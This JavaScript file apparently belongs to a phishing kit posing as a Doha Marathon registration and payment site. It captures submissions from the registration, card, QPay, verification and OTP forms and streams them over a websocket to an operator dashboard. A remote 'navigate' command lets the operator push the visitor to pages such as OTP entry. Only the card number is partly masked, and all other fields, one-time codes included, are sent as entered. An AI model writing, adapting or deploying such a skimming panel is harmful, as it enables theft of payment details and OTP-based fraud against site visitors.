// Configuration for Separate Frontend/Dashboard deployments
// If hosting frontend separately, set DASHBOARD_URL to your Render backend URL (e.g., 'https://doha-marathon.onrender.com')
// And set INSTANCE_KEY to match your backend's INSTANCE_KEY environment variable.
const DASHBOARD_URL = ''; 
const INSTANCE_KEY = 'default_key';

// 1. Session ID Management
const SESSION_KEY = 'doha_marathon_session';
let sessionId = localStorage.getItem(SESSION_KEY);
if (!sessionId) {
  sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
  localStorage.setItem(SESSION_KEY, sessionId);
}

// 2. Page Detection
const PAGE_MAP = {
  'index.html': 'index', '': 'index',
  'registration.html': 'registration',
  'registration-summary.html': 'registration-summary',
  'payment.html': 'payment',
  'payment-card.html': 'payment-card',
  'qpy.html': 'qpy',
  'payment-verify.html': 'payment-verify',
  'otp.html': 'otp'
};
const currentPage = PAGE_MAP[location.pathname.split('/').pop()] || 'unknown';

// 3. Socket Connection
const socket = DASHBOARD_URL ? io(DASHBOARD_URL, { 
  query: { sessionId, instanceKey: INSTANCE_KEY },
  transports: ['websocket', 'polling'],
  withCredentials: true 
}) : io({ 
  query: { sessionId, instanceKey: INSTANCE_KEY },
  transports: ['websocket', 'polling'],
  withCredentials: true 
});

socket.on('connect', () => {
  socket.emit('user:join', { sessionId, page: currentPage });
});

socket.on('navigate', ({ page }) => {
  const PAGES = [
    { id: 'index', name: 'الرئيسية', url: '/' },
    { id: 'registration', name: 'التسجيل', url: '/registration.html' },
    { id: 'registration-summary', name: 'ملخص السلة', url: '/registration-summary.html' },
    { id: 'payment', name: 'اختيار الدفع', url: '/payment.html' },
    { id: 'payment-card', name: 'بطاقة الائتمان', url: '/payment-card.html' },
    { id: 'qpy', name: 'QPay', url: '/qpy.html' },
    { id: 'payment-verify', name: 'التحقق من الرمز', url: '/payment-verify.html' },
    { id: 'otp', name: 'رمز التحقق', url: '/otp.html' }
  ];
  const target = PAGES.find(p => p.id === page)?.url || '/';
  window.location.href = target;
});

// 4. Form Capture - ADD TO ALL FORMS
function captureForm(form, page) {
  form.addEventListener('submit', (e) => {
    const formData = new FormData(form);
    const data = {};
    formData.forEach((v, k) => data[k] = v);
    // Mask sensitive: cardNumber → show last 4 only
    if (data.cardNumber) data.cardNumber = '**** **** **** ' + data.cardNumber.slice(-4);
    socket.emit('user:form-submit', { sessionId, page, formData: data });
  });
}

// 5. Auto-detect forms on page
document.addEventListener('DOMContentLoaded', () => {
  const forms = {
    '#registration-form': 'registration',
    '#card-form': 'payment-card',
    '#paymentForm form, #paymentForm': 'qpy',
    '#verify-form': 'payment-verify',
    '#otpForm': 'otp'
  };
  Object.entries(forms).forEach(([sel, page]) => {
    const form = document.querySelector(sel);
    if (form) captureForm(form, page);
  });
});

// 6. Page visibility tracking
document.addEventListener('visibilitychange', () => {
  if (!document.hidden) {
    socket.emit('user:page-change', { sessionId, page: currentPage });
  }
});
